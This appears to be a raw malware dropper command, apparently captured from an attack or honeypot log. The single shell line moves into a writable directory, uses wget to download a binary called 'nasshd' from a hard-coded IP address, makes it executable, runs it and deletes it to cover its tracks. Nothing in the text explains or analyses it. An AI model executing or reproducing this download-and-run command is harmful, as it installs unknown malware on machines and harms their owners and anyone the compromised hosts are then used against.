cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.72.95/nasshd; chmod +x nasshd; ./nasshd; rm -rf nasshd
